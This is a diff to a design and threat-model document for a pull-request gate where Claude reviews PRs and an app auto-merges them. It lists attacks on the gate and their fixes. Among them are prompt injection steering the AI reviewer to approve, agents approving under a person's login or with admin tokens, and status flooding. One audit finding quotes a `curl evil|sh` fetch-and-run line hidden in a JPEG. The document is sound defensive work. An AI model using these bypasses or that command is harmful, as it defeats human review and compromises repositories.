@@ -42,7 +42,7 @@ Three comment commands on a pull request:
 | Pinned Claude SDK | `templates/github/autopilot/requirements.txt` |
 | Duplicate-test skip | `templates/github/autopilot/skip_duplicate_main.py` |
 | Install steps for `/autopilot apply` | `docs/v2-install.md` |
-| Tests (59) | `scripts/test_gate.py` |
+| Tests (64) | `scripts/test_gate.py` |
 | Dry run, one scenario per rule, incl. what each reports under "Decided without you" | `scripts/gate_dryrun.py` (last output: `out/gate-dryrun.txt`) |
 | Draft for chasing-shade's test.yml (not applied) | `drafts/chasing-shade/test.yml`, `test.yml.patch` |
 
@@ -52,7 +52,7 @@ Three comment commands on a pull request:
 pull_request_target (workflow + checkout always from the default branch)
   mark    [env autopilot]                             head commit -> "pending" (closed unmerged -> "failure")
   review  [env autopilot-review: ANTHROPIC_API_KEY]   git-fetch PR as data -> classify -> Claude review(s) -> job output
-  decide  [env autopilot: GitHub App key]             re-read PR live + re-classify -> combine -> status, comment, auto-merge
+  decide  [env autopilot: GitHub App key]             re-read PR live + re-classify -> combine -> check run, comment, auto-merge
 issue_comment
   command [env autopilot]                             "/autopilot approve <sha>" (admin) -> success for that sha
                                                       "/autopilot stop" (can push) -> hold record, red, auto-merge off
@@ -70,7 +70,8 @@ issue_comment
   image data decompresses, nothing after the end). Every other binary, Git LFS pointers included, needs a person: GIF, WebP, font and 3D-model
   headers can also start a working JavaScript file.
 - **What the person reads can't be faked.** Anyone who can push can edit any comment, so the full review also goes
-  to the run summary (the Details link on the `autopilot/gate` check), and `/autopilot approve` is refused if anyone
+  to the `autopilot/gate` check run's details and the run summary (only the app can write either), and
+  `/autopilot approve` is refused if anyone
   but the app edited the gate's comment.
 - **Secrets in environments locked to the default branch.** A workflow added by a pull request runs on
   `refs/pull/N/merge` and can't use them; the gate's own runs count as the default branch.
@@ -96,20 +97,21 @@ injection in issues, web pages or code they read; anyone with push access; outsi
 |---|---|---|
 | PR edits the gate or the workflow so it approves itself | `pull_request_target` runs the default branch's copy; such PRs are "needs a person" | A person approving a malicious gate change |
 | PR grants itself a higher level in `autopilot.json` | Settings read from the default-branch checkout; the file is a never-auto-merge path | none |
-| PR adds a workflow that posts `autopilot/gate: success` | Ruleset pins the check to the app's ID; app key is environment-locked | Must be configured exactly as in v2-install.md; verify with the spoof test there |
+| PR adds a workflow that posts `autopilot/gate: success` | The result is a check run owned by the app, and the ruleset pins the check to the app's ID: other workflows' check runs or statuses with that name don't count and can't change it; app key is environment-locked | Must be configured exactly as in v2-install.md; verify with the spoof test there |
+| Flooding the result (1000 junk statuses froze the old commit-status result) | Check runs belong to the app that created them; the gate updates its own run in place, and reads only its own app's runs | none known |
 | PR adds a workflow that reads secrets | Gate secrets live only in default-branch-locked environments | Repo- or org-level secrets the repo already has are as exposed as today |
-| Push after approval (review commit A, merge commit B) | Status is per commit; auto-merge pinned with `expectedHeadOid`; direct merge pinned with `sha` | none known |
+| Push after approval (review commit A, merge commit B) | The check run is per commit; auto-merge pinned with `expectedHeadOid`; direct merge pinned with `sha` | none known |
 | Reusing an old approval of the same commit (new PR, cancelled run) | Every run first marks the commit "pending"; closing a PR unmerged marks it "failure" | A write user cancelling the run leaves "pending": blocked, not merged |
 | Cancelling a review, hold or approval by pushing/commenting/relabelling | No workflow-wide concurrency; only review/decide of the same PR replace each other | none known |
 | Lifting a hold without a person | The label's event history (uneditable) decides; removal by anyone but an admin, maintainer or the app is undone | none known |
 | Editing the gate comment before a person approves | Full review in the run summary; approval refused if the comment was edited by anyone but the app | none known |
 | Cancelling runs (needs `actions: write`) | A cancelled run leaves "pending" or nothing: blocked, not merged | Cancel the very first run on a commit an earlier PR approved and the old result stands until the next run; keep `actions: write` away from agents |
 | Merging a green pull request by hand | Required checks and the ruleset | Anyone with write access, an agent included, can merge a green PR or turn auto-merge on after a person approves; GitHub has no "only this app may merge" rule short of restricting who can push |
-| Same commit approved in a PR to another branch, reused for the default branch | The gate posts statuses only for PRs into the default branch | none known |
+| Same commit approved in a PR to another branch, reused for the default branch | The gate writes results only for PRs into the default branch | none known |
 | Prompt injection steering Claude to approve | Fenced untrusted block; reviewer told to flag attempts (flag = needs a person); deterministic rules for settings/workflows/human paths don't depend on the model; sensitive areas get a second, adversarial review | **Main residual risk.** A clever injection in a non-sensitive file could still win one review. Keep `sensitive.paths` broad |
 | Hiding code from the reviewer | Diff over 600k characters, submodules, symlinks, any binary but a well-formed PNG, LFS pointers all need a person; `.gitattributes` ignored when diffing; path rules match case-insensitively, renames check both paths, a matched folder covers its files | Logic hidden in plain sight in a non-sensitive file (same as any human review); a valid PNG can still carry text inside it (for example in uncompressed image data), which matters only if something on `main` already runs an image file with `sh` |
 | Malicious dependency in the Claude SDK | Exact versions with hashes; that job holds only the Anthropic key and can't write to GitHub | A compromised pinned version could leak the Anthropic key |
-| Agent posts `/autopilot approve` using a person's login | Only admins/maintainers who didn't open the PR, push to it (the app records each pusher in its own statuses) or appear as a commit author/committer; full 40-character commit id; app/bot comments refused; a re-run, deleted, edited or pre-hold comment doesn't count | **Real:** Claude sessions use David's own `gh` login, so the gate can't tell David from an agent acting as David. See decision 3 |
+| Agent posts `/autopilot approve` using a person's login | Only admins/maintainers who didn't open the PR, push to it (the app records each pusher in its own check run) or appear as a commit author/committer; full 40-character commit id; app/bot comments refused; a re-run, deleted, edited or pre-hold comment doesn't count | **Real:** Claude sessions use David's own `gh` login, so the gate can't tell David from an agent acting as David. See decision 3 |
 | Admin merges around the gate | Ruleset with no bypass list | Any admin token (incl. a Claude session using it) can still change rules; that is GitHub's model |
 | Fork PRs spending money | Forks get "needs a person" with no Claude call | none |
 | Cost run-up from many pushes | One review per push, latest push cancels the older run | No hard cap in the gate; set an Anthropic workspace spend limit |
@@ -181,18 +183,30 @@ override a person's earlier approval (it does now).
 | Finding | Fix |
 |---|---|
 | (medium) Re-running an old command run replayed it: an old `/autopilot resume` lifted a later hold, an old approve turned the check green, even with the comment deleted | Commands count only on the run's first attempt, only if the comment still exists unedited, and only if it is newer than the latest hold change; approve is refused while on hold |
-| (medium) 1000 junk `autopilot/gate` statuses on a commit froze its check green, so a stop failed silently | Stop puts the label on and auto-merge off before the status; any red result that can't be posted turns the PR back into a draft and fails the job loudly. Longer term: move the gate's result to a check run (only the app can update its own check runs) |
+| (medium) 1000 junk `autopilot/gate` statuses on a commit froze its check green, so a stop failed silently | Stop puts the label on and auto-merge off before the status; any red result that can't be posted turns the PR back into a draft and fails the job loudly (superseded in round 5 by the check run) |
 | Race between decide and a stop | The hold is read again right before anything turns green, and again after auto-merge is turned on (turned off and red if held) |
 | Reviewer text could carry HTML, links and images into the comment | `<`, `>`, `&` escaped; Markdown link/image brackets escaped; bare links broken |
 | "Decided without you" missing from stop/resume/approve/refusal replies, label restore not reported, notes after the section | Every command reply ends with the section; putting the hold label back is reported; the section is always last |
 | JPEG and ICO checks were shallow (a JPEG with `curl evil|sh` in the middle passed) | Only PNG passes alone, with image data that must decompress; JPEG/ICO need a person |
-| Self-approval relied on commit author fields the pusher controls | Also refuses whoever pushed (recorded by the app in its statuses); residual risk spelled out under decision 3 |
+| Self-approval relied on commit author fields the pusher controls | Also refuses whoever pushed (recorded by the app; in its check run since round 5); residual risk spelled out under decision 3 |
 | File names with right-to-left overrides, zero-width or C1 control characters passed | Any Unicode Cc/Cf/Zl/Zp character needs a person |
 | Very long reviews could exceed the 128 KB limit on the environment variable carrying them, leaving the PR pending | Review text capped; an oversized hand-over becomes an error, which reads as "needs a person" |
 | Removing the hold label without rights still paid for an Opus review | The review is skipped when the remover can't lift a hold (the label goes back anyway) |
 | (note) Required test checks pinned to GitHub Actions (15368) can be faked by any workflow on any branch that asks for `checks: write` | Documented in v2-install.md with the options; accepted as residual by default |
 
-All round-4 fixes have a test or dry-run scenario; they await the reviewer's re-check.
+All round-4 fixes have a test or dry-run scenario.
+
+**Round 5** (the reviewer's re-check of round 4: one medium still open, one low, one cosmetic):
+
+| Finding | Fix |
+|---|---|
+| (medium) Status flooding still defeated a hold: with the 1000 status slots full, a stop couldn't post red, the draft conversion could be undone with `gh pr ready` and the frozen green merged; closing and reopening worked the same way | The gate's result is now a **check run** owned by the app: mark creates one per gate run (pending), and decide, stop, approve and close update it in place. Only the app can write it, there is no shared cap, and the ruleset pins it by app ID. The pusher record moved into the same check run (carried across pushes via the previous head). The draft conversion stays as belt and braces for a refused write |
+| (low) The paid-review skip treated a failed permission lookup as "can't lift a hold" | A failed lookup now runs the review; the review job keeps its read-only token |
+| (cosmetic) A `#` line in a quoted summary rendered as a heading; file names in reasons showed escaped twice | Leading `#` neutralised in quotes; escaping skips inline code spans |
+
+To verify live (step 5 of v2-install.md): that a completed check run's conclusion can be changed by PATCH (stop
+turning a green run red relies on it, as GitHub documents) and that the ruleset ignores same-named check runs from
+other apps.
 
 Left as decisions or residual risk: one app key shared across repos (decision 1), agents with admin tokens or
 `actions: write` (decision 3), anyone with write access merging a green PR by hand, required test checks that a PR's
